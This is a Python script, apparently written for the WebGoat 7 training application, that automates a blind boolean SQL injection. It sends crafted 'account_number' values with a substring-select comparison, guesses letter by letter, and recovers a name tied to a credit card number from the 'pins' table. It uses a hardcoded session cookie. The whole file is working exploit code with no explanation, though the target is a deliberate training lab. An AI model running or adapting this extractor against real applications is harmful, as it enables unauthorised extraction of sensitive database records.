import requests
from bs4 import BeautifulSoup

alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'

url = 'http://webgoat7.com/WebGoat/attack?Screen=1315528047&menu=1100'
cookies = {'JSESSIONID': '27ECDE6D05CC10D2041A0D3673AEA3ED'}

answer = []

for i in range(1, 100):
    
    flags = []
    
    for char in alphabet:
        post_data = {'account_number': "101 and substring(select name from pins where cc_number = '4321432143214321', " + str(i) + ", 1) >= '" + char + "'", 'SUBMIT': 'Go!'}
        response = requests.post(url, cookies=cookies, data=post_data)
        html = response.text
        soup = BeautifulSoup(html, 'html.parser')

        flags.append(soup.find_all('p')[-1].text)
        
        if 'Account number is valid' not in flags:
            break
        
        elif flags[len(flags) - 1] != flags[len(flags) - 2]:
            answer.append(alphabet[alphabet.index(char) - 1])
            
print(''.join(answer))
